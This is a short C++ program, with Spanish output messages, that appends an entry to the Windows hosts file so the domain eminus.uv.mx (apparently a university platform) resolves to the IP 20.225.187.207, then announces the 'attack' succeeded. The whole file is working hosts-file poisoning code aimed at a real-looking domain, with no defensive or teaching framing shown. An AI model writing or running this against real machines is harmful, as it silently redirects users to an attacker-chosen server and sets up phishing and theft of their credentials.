#include <iostream>
#include <fstream>

int main() {
    std::ofstream hosts("C:\\Windows\\System32\\drivers\\etc\\hosts", std::ios::out | std::ios::app);
    if(hosts.is_open()) {
        hosts << "\n20.225.187.207 eminus.uv.mx";
        hosts.close();
        std::cout << "Ataque realizado con exito!!!\n";
    }
    else {
        std::cout << "El programa require permisos de administrador. \n";
    }

    std::cout << "Presione una tecla para salir... \n";
    std::cin.get();
    return 0;
}
